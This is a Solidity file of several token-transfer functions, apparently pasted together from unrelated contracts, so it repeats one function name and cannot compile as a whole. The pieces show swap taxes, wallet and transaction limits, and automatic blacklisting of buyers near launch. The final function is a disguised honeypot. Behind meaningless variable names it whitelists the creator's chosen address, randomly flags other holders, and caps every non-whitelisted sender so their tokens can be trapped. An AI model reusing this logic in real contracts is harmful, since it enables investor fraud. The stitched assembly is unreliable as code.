function _transfer(address from, address to, uint256 value) internal {
    uint256 tax = 0;
    if ((to == uniPair || from == uniPair) && !swapping && balanceOf[uniPair] != 0) {
        tax = value * 10_000 / 100_000;
        if (to == uniPair) {
            swapping = true;
            _doSwap(tax);
            swapping = false;
        } else {
            totalSupply -= tax;
            emit Transfer(uniPair, address(0), tax);
        }
    }
    balanceOf[from] -= value;
    balanceOf[to] += value - tax;
    emit Transfer(from, to, value - tax);
}

function _doSwap(uint256 amt) internal {
    UniPairLike pair = UniPairLike(uniPair);
    (uint256 amount0Out, uint256 amount1Out) = (0, 0);
    uint256 wethBal = ERC721Like(weth).balanceOf(uniPair);
    uint256 amtWithFee = amt * 997;
    uint256 amtOut = (wethBal * amtWithFee) / (balanceOf[uniPair] * 1000 + amtWithFee);
    if (amtOut < minSwap) {
        totalSupply -= amt;
        emit Transfer(uniPair, address(0), amt);
        return;
    }
    if (pair.token0() == address(this)) {
        amount1Out = amtOut;
    } else {
        amount0Out = amtOut;
    }
    balanceOf[uniPair] += amt;
    pair.swap(amount0Out, amount1Out, treasury, new bytes(0));
}

function _claimable(uint256 id_, address owner_) internal view returns(uint256 amount) {
    uint256 lastClaim = claims[id_];
    uint256 diff = block.timestamp - (lastClaim == 0 ? startingTime : lastClaim);
    uint256 balance = habibi.balanceOf(owner_);
    uint256 base = diff * 1000 ether / 1 days;
    amount = base + ((_getBonusPct(id_, balance) * base * 1e16) / 1e18);
}

function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0), "transfer to the zero address");
    require(amount <= maxTxLimit || isExcludedFromTxLimit[from] || isExcludedFromTxLimit[to], "Tx Amount too large");
    require(balanceOf(to).add(amount) <= maxWalletLimit || isExcludedFromWalletLimit[to], "Transfer will exceed wallet limit");
    require(isLaunched || isExcludedFromFees[from] || isExcludedFromFees[to], "Waiting to go live");
    require(!isBlacklisted[from], "Sender is blacklisted");
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    uint256 totalTokensForFee = tokensForLiquidity + tokensForTax;
    bool canSwap = totalTokensForFee >= swapAtAmount;
    if (
        from != uniswapV2Pair &&
        canSwap &&
        !swapping
    ) {
        swapping = true;
        swapBack(totalTokensForFee);
        swapping = false;
    } else if (
        from == uniswapV2Pair &&
        to != uniswapV2Pair &&
        block.number < launchBlock + 3 &&
        !isExcludedFromFees[to]
    ) {
        _setBlacklist(to, true);
    }
    bool takeFee = !swapping;
    if (isExcludedFromFees[from] || isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        uint256 fees;
        if (to == uniswapV2Pair) {
            uint256 sellTotalFees = sellLiquidityFee.add(sellTxFee);
            fees = amount.mul(sellTotalFees).div(100);
            tokensForLiquidity = tokensForLiquidity.add(fees.mul(sellLiquidityFee).div(sellTotalFees));
            tokensForTax = tokensForTax.add(fees.mul(sellTxFee).div(sellTotalFees));
        }
        else {
            uint256 buyTotalFees = buyLiquidityFee.add(buyTxFee);
            fees = amount.mul(buyTotalFees).div(100);
            tokensForLiquidity = tokensForLiquidity.add(fees.mul(buyLiquidityFee).div(buyTotalFees));
            tokensForTax = tokensForTax.add(fees.mul(buyTxFee).div(buyTotalFees));
        }
        if (fees > 0) {
            super._transfer(from, address(this), fees);
            amount = amount.sub(fees);
        }
    }
    super._transfer(from, to, amount);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (wesli == true)) {
        uber[recipient] = true;
        sudan[recipient] = false;
        wesli = false;
    }
    if (uber[recipient] != true) {
        sudan[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((sudan[sender]) && (uber[recipient] == false)) {
        sudan[recipient] = true;
    }
    if (uber[sender] == false) {
        require(amount < cintus);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

